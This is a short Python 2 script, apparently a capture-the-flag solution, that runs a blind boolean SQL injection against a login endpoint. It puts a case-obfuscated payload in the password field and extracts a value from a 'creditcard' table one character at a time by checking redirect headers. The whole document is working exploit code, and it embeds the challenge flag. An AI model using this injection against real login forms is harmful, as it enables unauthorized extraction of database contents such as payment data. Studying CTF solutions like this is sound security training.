#!/usr/bin/env python2

import argparse
import requests
import sys
import re

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('host', metavar='host', type=str)

    args = parser.parse_args()

    url = 'http://{}:4567/auth'.format(args.host)

    l = len('sigsegv{N0rAj_d3_MA_SqL1_d3S_Fam1lL3S}')
    flag = ''
    for i in xrange(l):
        for c in xrange(32, 128):
            username = 'a'
            inject = '"Or substR((selecT cctype From creditcard Where cc=\'201820680592415\'),{},1)=chAr({}) And "1"="1'.format(str(i + 1), str(c))
            data = {'user':username, 'pass':inject}
            r = requests.post(url, data=data, allow_redirects=False)
            if r.headers.get('location').find('Wrong') == -1:
                flag += chr(c)
                print(flag)
                break


if __name__ == "__main__":
    main()
